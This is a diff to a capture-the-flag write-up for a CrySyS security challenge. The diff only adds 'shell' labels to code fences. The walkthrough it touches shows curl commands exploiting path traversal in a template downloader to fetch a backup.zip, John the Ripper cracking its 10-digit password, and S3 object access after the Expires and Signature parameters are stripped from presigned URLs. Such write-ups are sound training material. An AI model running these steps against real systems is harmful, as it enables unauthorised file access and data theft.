@@ -13,7 +13,7 @@ The source of https://instant-development-company.secchallenge.crysys.hu/ reveal
 
 There are a couple of potential attack points in that page. One is a template file viewer. Let's try that on debug.html with curl:
 
-```
+```shell
 > curl 'https://instant-development-company.secchallenge.crysys.hu/download/templates'  --data-raw 'template=debug.html'
 {% extends "base.html" %}
 
@@ -63,16 +63,16 @@ There are a couple of potential attack points in that page. One is a template fi
 
 Bingo. There has to be a backup.zip somewhere with a password of 10 digits. Let's try downloading the zip with the template downloader again:
 
-```
+```shell
 > curl 'https://instant-development-company.secchallenge.crysys.hu/download/templates'  --data-raw 'template=../backup.zip' > backup.zip
 ```
 Now run John the ripper to get the password:
-```
+```shell
 > john --incremental=digits --min-length=10 --max-length=10 hash.txt
 ```
 
 Unzip the file
-```
+```shell
 > unzip -P REDACTED backup.zip
 ```
 
@@ -84,7 +84,7 @@ https://instant-development-company.s3.eu-central-1.amazonaws.com/00000000-0000-
 ```
 
 But we cannot download them:
-```
+```shell
 > curl https://instant-development-company.s3.eu-central-1.amazonaws.com/00000000-0000-0000-0000-000000000000?AWSAccessKeyId=00000000000000000000&Expires=1635928981&Signature=00000000000000_0000000000000%3d
 <?xml version="1.0" encoding="UTF-8"?>
 <Error><Code>AccessDenied</Code><Message>Request has expired</Message><Expires>2021-10-13T20:41:40Z</Expires><ServerTime>2022-03-16T06:57:35Z</ServerTime><RequestId>7D3PB49BH510BXPD</RequestId><HostId>kpPQtioPMo0Tq+sY0b5wg5mlH+ZmJc/vwT7AAKwFrHSaxGLGt0cosQ1YwAqm2sAVfosziX8Tric=</HostId></Error>
@@ -92,7 +92,7 @@ But we cannot download them:
 
 Try removing the expires and signature part from the url:
 
-```
+```shell
 > curl https://instant-development-company.s3.eu-central-1.amazonaws.com/00000000-0000-0000-0000-000000000000?AWSAccessKeyId=00000000000000000000
 ...bunch of text...
 ```
